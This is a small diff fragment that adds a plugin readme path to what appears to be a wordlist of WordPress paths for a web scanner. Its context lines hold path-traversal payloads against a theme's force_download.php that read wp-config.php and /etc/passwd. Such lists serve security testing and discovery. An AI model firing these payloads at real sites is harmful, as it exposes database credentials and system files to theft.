@@ -1050,3 +1050,4 @@
 /wp-content/themes/the-wound/force_download.php?file=../../../wp-config.php
 /wp-content/themes/the-wound/force_download.php?file=/etc/passwd
 /wp-content/plugins/fastdup/logs/
+/wp-content/plugins/geo-mashup/readme.txt
